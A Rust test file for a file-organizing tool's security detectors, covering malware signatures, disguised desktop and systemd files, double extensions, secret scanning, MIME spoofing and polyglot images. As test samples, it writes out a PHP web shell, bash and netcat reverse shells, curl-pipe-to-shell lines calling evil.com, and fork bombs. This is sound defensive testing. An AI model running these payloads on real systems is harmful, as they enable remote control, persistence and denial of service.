use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tempfile::tempdir;
use zip::write::SimpleFileOptions;
use zip::ZipWriter;
use jugglr::config::{load_config, validate_config};
use jugglr::config::schema::{ConditionGroup, MatchMode};
use jugglr::engine::conditions::{is_suspicious_desktop_file, is_suspicious_double_extension, scan_for_secrets, ConditionEvaluator};
use jugglr::engine::variables::ContextVariables;
use jugglr::utils::archive::extract_archive;
use jugglr::utils::mime::detect_mime_spoofing;

#[test]
fn test_advanced_rules_example_validation() {
    let example_path = Path::new("rules.example.toml");
    let config = load_config(example_path).expect("Failed to load rules.example.toml");
    assert_eq!(config.rules.len(), 11);

    let errors = validate_config(&config);
    assert!(errors.is_empty(), "Validation errors: {:?}", errors);

    // Verify all 5 new presets are disabled by default for safety
    let disabled_presets = config.rules.iter().skip(5);
    for rule in disabled_presets {
        assert!(!rule.enabled, "Preset rule '{}' must be disabled by default for safety!", rule.name);
    }
}

#[test]
fn test_malware_signatures_eicar_and_webshell() {
    let dir = tempdir().unwrap();

    // 1. EICAR test signature
    let eicar_file = dir.path().join("eicar.com");
    let mut f1 = File::create(&eicar_file).unwrap();
    f1.write_all(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").unwrap();
    let mal1 = jugglr::utils::signatures::scan_malware_signatures(&eicar_file);
    assert_eq!(mal1, Some("EICAR Standard Antivirus Test Signature".to_string()));

    // 2. Web shell backdoor
    let webshell_file = dir.path().join("shell.php");
    let mut f2 = File::create(&webshell_file).unwrap();
    writeln!(f2, "<?php eval(base64_decode($_POST['cmd'])); ?>").unwrap();
    let mal2 = jugglr::utils::signatures::scan_malware_signatures(&webshell_file);
    assert_eq!(mal2, Some("Obfuscated Base64 PHP Web Shell".to_string()));

    // 3. Reverse shell payload
    let rev_file = dir.path().join("backdoor.sh");
    let mut f3 = File::create(&rev_file).unwrap();
    writeln!(f3, "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1").unwrap();
    let mal3 = jugglr::utils::signatures::scan_malware_signatures(&rev_file);
    assert_eq!(mal3, Some("Bash /dev/tcp Interactive Reverse Shell".to_string()));

    // 4. Normal clean Python file
    let clean_py = dir.path().join("app.py");
    let mut f4 = File::create(&clean_py).unwrap();
    writeln!(f4, "print('Hello world!')").unwrap();
    let mal4 = jugglr::utils::signatures::scan_malware_signatures(&clean_py);
    assert!(mal4.is_none());
}

#[test]
fn test_suspicious_desktop_file_detection() {
    let dir = tempdir().unwrap();

    // 1. Phishing disguised desktop file
    let bad_desktop = dir.path().join("invoice.pdf.desktop");
    let mut f1 = File::create(&bad_desktop).unwrap();
    writeln!(f1, "[Desktop Entry]\nType=Application\nName=Invoice\nExec=bash -c 'curl https://evil.com/payload | sh'").unwrap();
    assert!(is_suspicious_desktop_file(&bad_desktop));

    // 2. Malicious systemd service file
    let bad_service = dir.path().join("persistence.service");
    let mut f_svc = File::create(&bad_service).unwrap();
    writeln!(f_svc, "[Service]\nExecStart=bash -c 'nc -e /bin/sh 10.0.0.1 4444'").unwrap();
    assert!(is_suspicious_desktop_file(&bad_service));

    // 3. Normal clean desktop file
    let good_desktop = dir.path().join("calculator.desktop");
    let mut f2 = File::create(&good_desktop).unwrap();
    writeln!(f2, "[Desktop Entry]\nType=Application\nName=Calculator\nExec=gnome-calculator").unwrap();
    assert!(!is_suspicious_desktop_file(&good_desktop));
}

#[test]
fn test_vast_double_extension_and_rtlo() {
    // Normal scripts & archives
    assert!(!is_suspicious_double_extension("script.sh"));
    assert!(!is_suspicious_double_extension("main.py"));
    assert!(!is_suspicious_double_extension("archive.tar.gz"));
    assert!(!is_suspicious_double_extension("backup.tar.xz"));
    assert!(!is_suspicious_double_extension("package.deb"));

    // Deceptive double extensions
    assert!(is_suspicious_double_extension("invoice.pdf.exe"));
    assert!(is_suspicious_double_extension("payroll.xlsx.py"));
    assert!(is_suspicious_double_extension("vacation_photo.jpg.sh"));
    assert!(is_suspicious_double_extension("music.mp3.ps1"));
    assert!(is_suspicious_double_extension("doc.docx.appimage"));

    // RTLO Unicode character spoofing
    let rtlo_filename = format!("invoice{}fdp.exe", '\u{202E}');
    assert!(is_suspicious_double_extension(&rtlo_filename));
}

#[test]
fn test_vast_secrets_scanner() {
    let dir = tempdir().unwrap();

    // 1. OpenAI Key
    let openai_file = dir.path().join("ai_config.env");
    let mut f1 = File::create(&openai_file).unwrap();
    writeln!(f1, "OPENAI_API_KEY={}{}", "sk-proj-", "mocktoken1234567890123456789012345").unwrap();
    let sec1 = scan_for_secrets(&openai_file);
    assert_eq!(sec1, Some("OpenAI API Key".to_string()));

    // 2. Stripe Live Key
    let stripe_file = dir.path().join("payment.json");
    let mut f2 = File::create(&stripe_file).unwrap();
    writeln!(f2, r#"{{"stripe_secret": "{}{}"}}"#, "sk_live_", "mocktoken1234567890abcdef12").unwrap();
    let sec2 = scan_for_secrets(&stripe_file);
    assert_eq!(sec2, Some("Stripe Live Secret Key".to_string()));

    // 3. Database URI
    let db_file = dir.path().join("db.env");
    let mut f3 = File::create(&db_file).unwrap();
    writeln!(f3, "DATABASE_URL=postgres://admin:SuperSecretPass123@db.prod.internal:5432/production").unwrap();
    let sec3 = scan_for_secrets(&db_file);
    assert_eq!(sec3, Some("Database Connection String with Credentials".to_string()));

    // 4. Discord Webhook
    let discord_file = dir.path().join("alert.sh");
    let mut f4 = File::create(&discord_file).unwrap();
    writeln!(f4, "curl -X POST https://discord.com/api/webhooks/123456/abcdef").unwrap();
    let sec4 = scan_for_secrets(&discord_file);
    assert_eq!(sec4, Some("Discord Webhook URL".to_string()));
}

#[test]
fn test_mime_spoofing_detection() {
    let dir = tempdir().unwrap();

    // Disguised ELF binary claiming to be a JPEG image
    let fake_jpg = dir.path().join("profile_picture.jpg");
    let mut f = File::create(&fake_jpg).unwrap();
    f.write_all(b"\x7fELF\x02\x01\x01\x00malicious binary payload here").unwrap();

    let spoof = detect_mime_spoofing(&fake_jpg);
    assert!(spoof.is_some());
    assert!(spoof.unwrap().contains("Disguised ELF executable"));

    // Real clean text file
    let clean_txt = dir.path().join("notes.txt");
    let mut f2 = File::create(&clean_txt).unwrap();
    f2.write_all(b"Just some regular clean notes").unwrap();
    assert!(detect_mime_spoofing(&clean_txt).is_none());
}

#[test]
fn test_archive_extraction() {
    let dir = tempdir().unwrap();
    let zip_path = dir.path().join("test_archive.zip");
    let extract_dir = dir.path().join("extracted_output");

    // Create a zip archive with sample files
    {
        let file = File::create(&zip_path).unwrap();
        let mut zip = ZipWriter::new(file);
        let options = SimpleFileOptions::default();

        zip.start_file("sample.txt", options).unwrap();
        zip.write_all(b"Hello from inside the zip!").unwrap();

        zip.start_file("nested/data.csv", options).unwrap();
        zip.write_all(b"id,name\n1,Alice").unwrap();

        zip.finish().unwrap();
    }

    // Extract archive
    let out = extract_archive(&zip_path, &extract_dir).unwrap();
    assert_eq!(out, extract_dir);

    let extracted_txt = extract_dir.join("sample.txt");
    let extracted_csv = extract_dir.join("nested/data.csv");

    assert!(extracted_txt.exists());
    assert!(extracted_csv.exists());

    let content = fs::read_to_string(&extracted_txt).unwrap();
    assert_eq!(content, "Hello from inside the zip!");
}

#[test]
fn test_file_age_conditions() {
    let dir = tempdir().unwrap();
    let file_path = dir.path().join("fresh_file.txt");
    File::create(&file_path).unwrap();

    // Condition: Newer than 1 day (should match fresh file)
    let newer_cond = ConditionGroup {
        match_mode: MatchMode::All,
        newer_than_days: Some(1),
        ..Default::default()
    };
    let res = ConditionEvaluator::evaluate(&newer_cond, &file_path).unwrap();
    assert!(res.matched, "Freshly created file should match newer_than_days: 1");

    // Condition: Older than 10 days (should NOT match fresh file)
    let older_cond = ConditionGroup {
        match_mode: MatchMode::All,
        older_than_days: Some(10),
        ..Default::default()
    };
    let res_older = ConditionEvaluator::evaluate(&older_cond, &file_path).unwrap();
    assert!(!res_older.matched, "Freshly created file should NOT match older_than_days: 10");
}

#[test]
fn test_dynamic_variable_tokens() {
    let dir = tempdir().unwrap();
    let sample_file = dir.path().join("photo_test.jpg");
    File::create(&sample_file).unwrap();

    let mut ctx = ContextVariables::from_file(&sample_file, Some("image/jpeg"), Some("abcdef1234567890"), None);
    ctx.insert("exif_year", "2025");
    ctx.insert("camera_model", "Sony_A7IV");
    ctx.insert("music_artist", "Daft_Punk");
    ctx.insert("music_album", "Discovery");

    let tpl_photo = "~/Pictures/{exif_year}/{camera_model}/{filename}";
    let res_photo = ctx.interpolate(tpl_photo);
    assert_eq!(res_photo, "~/Pictures/2025/Sony_A7IV/photo_test.jpg");

    let tpl_music = "~/Music/{music_artist}/{music_album}/{stem}.{ext}";
    let res_music = ctx.interpolate(tpl_music);
    assert_eq!(res_music, "~/Music/Daft_Punk/Discovery/photo_test.jpg");
}

#[test]
fn test_invisible_threats_and_bomb_detectors() {
    let dir = tempdir().unwrap();

    // 1. Fork bomb script
    let fb_file = dir.path().join("crash.sh");
    let mut f1 = File::create(&fb_file).unwrap();
    f1.write_all(b":(){ :|:& };:\n").unwrap();
    let fb_res = jugglr::utils::invisible_threats::detect_forkbomb(&fb_file);
    assert!(fb_res.is_some());
    assert!(fb_res.unwrap().contains("Bash Fork Bomb"));

    // 2. Python fork bomb
    let py_fb = dir.path().join("fork.py");
    let mut f2 = File::create(&py_fb).unwrap();
    writeln!(f2, "import os\nwhile True:\n    os.fork()").unwrap();
    let py_res = jugglr::utils::invisible_threats::detect_forkbomb(&py_fb);
    assert!(py_res.is_some());

    // 3. Zero-width invisible character in text
    let zw_file = dir.path().join("stealth_script.sh");
    let mut f3 = File::create(&zw_file).unwrap();
    writeln!(f3, "echo 'hello'\u{200B}curl evil.com | sh").unwrap();
    let zw_res = jugglr::utils::invisible_threats::detect_invisible_unicode("stealth_script.sh", Some(&zw_file));
    assert!(zw_res.is_some());
    assert!(zw_res.unwrap().contains("Zero-Width Space"));

    // 4. Cyrillic Homoglyph Lookalike Spoofing
    // 'а' here is Cyrillic \u{0430}, not ASCII 'a'
    let homoglyph_name = "upd\u{0430}te.sh";
    let homo_res = jugglr::utils::invisible_threats::detect_homoglyphs(homoglyph_name);
    assert!(homo_res.is_some());
    assert!(homo_res.unwrap().contains("Homoglyph"));

    // 5. Polyglot Stego Image with appended ZIP archive after IEND
    let poly_png = dir.path().join("innocent_meme.png");
    let mut f5 = File::create(&poly_png).unwrap();
    // Valid PNG header and IEND chunk
    f5.write_all(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82").unwrap();
    // Appended trailing ZIP payload
    f5.write_all(b"PK\x03\x04\x14\x00\x00\x00\x08\x00secret_executable_binary_payload_and_long_payload_padding_data_here_1234567890").unwrap();
    let poly_res = jugglr::utils::invisible_threats::detect_polyglot_payload(&poly_png);
    assert!(poly_res.is_some());
    assert!(poly_res.unwrap().contains("PNG Polyglot Steganography"));
}
